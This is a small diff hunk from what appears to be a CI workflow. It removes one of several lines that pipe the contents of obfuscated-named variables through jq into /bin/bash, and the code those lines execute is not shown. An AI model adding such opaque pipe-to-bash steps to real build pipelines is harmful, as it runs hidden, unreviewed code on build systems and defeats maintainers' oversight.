@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$cez942" | jq -r .e5947 | /bin/bash
           echo $rkdzn3353 | jq -r .x6529 | /bin/bash
           echo $bpmmr967 | jq -r .efj719 | /bin/bash
-          echo $re6 | jq -r .ao701 | /bin/bash
           echo $v26 | jq -r .mcr160 | /bin/bash
 
       - name: Save archive
